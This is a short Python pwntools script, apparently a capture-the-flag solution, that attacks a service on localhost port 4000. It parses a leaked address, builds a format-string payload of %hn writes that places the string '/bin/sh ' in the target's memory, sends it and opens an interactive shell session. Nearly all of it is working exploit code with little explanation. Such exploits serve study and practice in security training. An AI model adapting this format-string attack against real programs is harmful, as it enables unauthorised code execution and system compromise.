from pwn import *
import re

p = remote('127.0.0.1', 4000)


temp = p.recvline()
print temp
cari = re.search('Nomor Pengguna: (.+?)\n', temp)
youadd = eval("0" + cari.group(1))
youadd2 = p32(youadd + 2)
youadd3 = p32(youadd + 4)
youadd4 = p32(youadd + 6)
youadd = p32(youadd)

hspasi = 0x2068 - 16
stripb = 0x622f - 0x2068
inn = 0x6e69 - 0x622f
strips = 0x732f - 0x6e69

# /bin = '0x6e69622f'
# /sh  = '0x2068732f'

# /  '0x2f'
# b  '0x62'
# i  '0x69'
# n  '0x6e'
# /  '0x2f'
# s  '0x73'
# h  '0x68'
#    '0x20'

# urutanpayload
# youadd : stripb
# youadd2 : inn
# youadd3 : strips
# youadd4 : hspasi
payload1 = youadd4 + youadd  + youadd2 + youadd3 + "%"+str(hspasi)+"x"+"%5$hn"  + "%"+str(stripb)+"x"+"%6$hn"
payload1 += "%"+str(inn)+"x"+"%7$hn" + "%"+str(strips)+"x"+"%8$hn" + "\x00"

#payload1 

p.sendline(payload1)

print payload1
print p.recvline()
p.interactive()
